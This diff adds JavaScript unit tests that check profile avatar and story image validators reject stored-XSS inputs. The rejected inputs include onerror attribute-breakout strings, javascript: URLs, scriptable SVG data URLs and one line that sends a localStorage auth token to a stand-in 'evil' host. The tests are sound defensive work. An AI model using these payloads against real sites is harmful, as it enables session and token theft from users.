@@ -211,3 +211,49 @@ describe('updateProfileSchema (E2EE fields)', () => {
     assert.throws(() => updateProfileSchema.parse({ ...backup, e2ee_backup_iters: 1000 }));
   });
 });
+
+// avatar_url is dropped verbatim into `<img src="${url}">` on the client, and
+// CSP allows inline event handlers — so a value that escapes the src attribute
+// is a stored XSS that fires for everyone who renders the avatar. These pin the
+// backend choke point that stops that.
+describe('avatar_url XSS hardening (updateProfileSchema)', () => {
+  const { updateProfileSchema } = require('../src/validation/userSchemas');
+
+  const accepts = ['data:image/png;base64,iVBORw0KGgo=', 'data:image/jpeg;base64,/9j/4AAQSkZJRg==', 'data:image/webp;base64,UklGRh4AAABXRUJQ', 'https://cdn.example.com/a/b.png'];
+  for (const url of accepts) {
+    it(`accepts a legitimate avatar: ${url.slice(0, 32)}…`, () => {
+      assert.doesNotThrow(() => updateProfileSchema.parse({ avatar_url: url }));
+    });
+  }
+
+  const attacks = [
+    'x" onerror="alert(document.cookie)',
+    'x" onerror="fetch(`//evil/?t=`+localStorage.chalk_token)',
+    'data:image/png,foo" onerror="alert(1)',      // valid-looking prefix, breaks out after
+    'data:image/svg+xml,<script>alert(1)</script>', // svg can script; not in the allowlist
+    'javascript:alert(1)',
+    'https://ok.com/a"><script>alert(1)</script>',
+    'http://plain-http.example.com/a.png',         // non-https rejected
+  ];
+  for (const url of attacks) {
+    it(`rejects an XSS/invalid avatar payload: ${url.slice(0, 32)}…`, () => {
+      assert.throws(() => updateProfileSchema.parse({ avatar_url: url }));
+    });
+  }
+});
+
+describe('story image XSS hardening (createStorySchema)', () => {
+  const { createStorySchema } = require('../src/validation/storySchemas');
+
+  it('accepts a real base64 image', () => {
+    assert.doesNotThrow(() => createStorySchema.parse({ image: 'data:image/jpeg;base64,/9j/4AAQSkZJRg==' }));
+  });
+
+  it('rejects a data:image prefix that breaks out of the src attribute', () => {
+    assert.throws(() => createStorySchema.parse({ image: 'data:image/png,x" onerror="alert(1)' }));
+  });
+
+  it('rejects a scriptable svg data url', () => {
+    assert.throws(() => createStorySchema.parse({ image: 'data:image/svg+xml,<script>alert(1)</script>' }));
+  });
+});
